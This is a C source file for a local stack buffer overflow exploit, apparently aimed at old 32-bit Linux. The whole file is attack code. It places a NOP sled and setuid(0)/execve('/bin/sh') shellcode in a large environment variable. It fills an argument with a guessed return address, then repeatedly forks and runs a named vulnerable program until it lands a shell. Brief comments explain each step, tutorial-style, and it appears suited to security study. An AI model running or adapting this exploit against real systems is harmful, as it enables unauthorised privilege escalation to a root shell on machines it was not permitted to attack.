#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>

// Length of env variable is 128k
#define ENV_LEN 128000

// Return address we used to overwrite eip
#define RET 0xbffffffc-ENV_LEN

char shellcode[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"; // paste shellcode

int main(int argc, char** argv){
	char* appname = NULL;
	char* buff = NULL;
	char env_var[ENV_LEN];
	char* env[2] = {env_var, NULL};
	int *p,i, ret, pid, payload_size;
	if(argc<3){
		printf("Invalid format. Type <app_name> <payload_size>\n");
		exit(1);
	}
	//lets get the name of the vulnerable application and the number of bytes needed to overwrite EIP
	appname = strdup(argv[1]);
	payload_size = atoi(argv[2]);
	buff = (char *) malloc(payload_size);   

	//Our payload will be first filled with a lot of ox90(NOP)
	memset(env_var, 0x90, ENV_LEN);
	env_var[ENV_LEN-1] = 0;
	//Then, we copy at the end of it our shellcode
	memcpy(env_var+ENV_LEN-strlen(shellcode)-1, shellcode, strlen(shellcode));
	//We are going to fill the stack area with our return address. sooner or later, the process execution will be led right there
	// and EIP will be successfully overwritten
	p = (int *) buff;
	for(i=0; i<payload_size; i+= sizeof(int), p++)
	    *p = RET;
	*p = 0;

	// While our process hasnt correctly quit
	do  {
	    switch(pid=fork()){
		case 0:
		    // Execute the vulnerable program using our crafted
		    printf("New process created\n");
		    execle(appname, appname, buff, NULL, env);
		    exit(1);
		    break;
		default:
		    // wait for child process to terminate and get its return 
		    waitpid(pid, &ret, 0);
		    break;
	    }
	} while(ret);
	return 0;	
}
